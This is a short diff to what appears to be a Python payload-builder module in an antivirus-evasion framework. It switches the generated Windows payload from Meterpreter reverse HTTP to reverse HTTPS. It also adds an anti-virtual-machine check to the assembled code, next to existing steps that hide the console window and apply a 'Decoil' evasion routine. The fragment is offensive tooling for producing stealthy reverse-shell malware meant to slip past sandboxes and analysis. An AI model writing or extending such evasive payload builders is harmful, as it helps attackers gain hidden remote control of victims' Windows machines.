@@ -10,7 +10,7 @@ def Construction():
     PLATFORM = "Windows"
     STAGED = "YES"
     
-    RC_PAYLOAD = "windows/meterpreter/reverse_http"
+    RC_PAYLOAD = "windows/meterpreter/reverse_https"
 
     print(core.amcolors.PURPLE + core.amcolors.BOLD + "[STAGED] Payload x86 Meterpreter Reverse HTTPS" + core.amcolors.ENDC)
 
@@ -29,6 +29,7 @@ def Construction():
         Final_Code = body.Start()
         Final_Code += str(PAYLOAD)
         Final_Code += body.Hide_Window_Console()
+        Final_Code += evasion.Anti_VM(FILENAME)
         Final_Code += evasion.Decoil()
         Final_Code += body.End()
 
